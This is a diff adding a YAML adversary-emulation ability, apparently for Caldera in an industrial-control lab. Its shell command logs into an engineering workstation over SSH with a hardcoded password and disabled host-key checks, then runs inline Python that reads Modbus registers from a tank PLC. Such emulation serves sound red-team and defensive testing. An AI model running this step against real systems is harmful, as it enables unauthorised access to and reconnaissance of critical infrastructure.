@@ -1,0 +1,22 @@
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000003
+  name: SSH Remote Execution - Read Tank Process State via EWS
+  description: |
+    Runs Modbus TCP (FC4 read input registers) from the EWS over SSH using Python 3
+    stdlib only. Avoids the Caldera modbus_cli PyInstaller binary on EWS, which can
+    fail with GLIBC mismatches on older workstation images.
+  tactic: collection
+  technique_id: T0801
+  technique_name: Monitor Process State
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      printf '%s'
+      'import socket,struct;ip,port,u="192.168.95.14",502,1;pdu=struct.pack(">BHH",4,1,2);pkt=struct.pack(">HHHB",1,0,len(pdu)+1,u)+pdu;s=socket.socket();s.settimeout(15);s.connect((ip,port));s.sendall(pkt);r=s.recv(4096);s.close();assert not (r[7] & 128), r.hex();bc=r[8];regs=[struct.unpack(">H",r[9+i:11+i])[0] for i in range(0,bc,2)];print("TANK_IR",regs)'
+      | sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      -o ConnectTimeout=15 engineer@192.168.95.5 'python3 -' &&
+      echo "EWS_REMOTE_READ_DONE"
+    timeout: 90
